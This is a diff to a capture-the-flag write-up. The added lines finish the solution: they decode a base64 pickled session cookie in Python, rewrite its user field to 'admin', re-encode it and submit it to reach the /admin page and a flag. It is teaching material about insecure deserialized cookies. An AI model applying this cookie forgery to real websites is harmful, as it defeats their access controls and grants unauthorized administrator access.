@@ -251,7 +251,7 @@ BurpSuite also has a built-in Decoder option that gets us the same value as usin
 
 The next step was to decode the String in Python.
 
-Running Python on the terminal, decoding the String told us the user was set to 'None'
+Running Python in the terminal, decoding the String told us the user was set to 'None'
 > `$ python`
 
 > `>>> import pickle`
@@ -261,3 +261,22 @@ Running Python on the terminal, decoding the String told us the user was set to 
 > `>>> pickle.loads('KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu'.decode('base64'))`
 
 > `{'python': 'pickles', 'subtle': 'hint', 'user': None}`
+
+If the user were to be set to 'admin' we could submit the modified cookie to the website. To do this we need to call the pickler's `dumps()` method and pass through the params we got but set the user to 'admin' like so:
+
+>`pickle.dumps({'python': 'pickles', 'subtle': 'hint', 'user': 'admin'})`
+
+which returns the String:
+> `"(dp0\nS'python'\np1\nS'pickles'\np2\nsS'subtle'\np3\nS'hint'\np4\nsS'user'\np5\nS'admin'\np6\ns."`
+
+We can assign the String to the variable `encoded`
+> `>>>> encoded=_`
+
+Then encode the modified String back to base64
+> `>>> base64.b64encode(encoded)`
+
+Lastly, modify the obsoletePickle cookie on the site to this hashed value then load the `/admin` page.
+> `'KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4='`
+
+>Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
+
